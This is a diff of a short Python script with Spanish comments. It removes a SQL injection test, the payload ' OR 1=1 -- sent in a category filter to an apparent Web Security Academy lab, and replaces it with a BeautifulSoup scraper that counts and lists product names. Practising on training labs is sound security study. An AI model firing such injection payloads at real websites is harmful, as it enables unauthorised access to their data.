@@ -1,17 +1,20 @@
 import requests # Permite hacer la peticion GET
+from bs4 import BeautifulSoup # Permite extraer datos del html
 
 # Parámetros de entrada
-url = "https://0a9d000b0422a15080a8db780055001b.web-security-academy.net"
-sql = "' OR 1=1 --"
+url = ""
 
 # Realizamos la petición GET
-r = requests.get(url + '/filter?category=' + sql)
+respuesta = requests.get(url)
 
-# Validamos si uno de los textos presentes 
-# en la consulta exitosa existe en la respuesta GET
-if "Gym Suit" in r.text:
-    print("Se ha realizado la inyección SQL exitosamente")
-else:
-    print("No se pudo realizar la inyección SQL")
+# Nos traemos todos los h3
+extraerDatos=BeautifulSoup(respuesta.text, 'html.parser')
+productos=extraerDatos.findAll('h3')
 
-print(r.text)
+print("Resultados: Conteo y lista de productos\n")
+print("Cantidad: " + str(len(productos)) + " productos\n")
+print("Listado de productos")
+print("--------------------")
+
+for producto in productos:
+    print (producto.get_text())
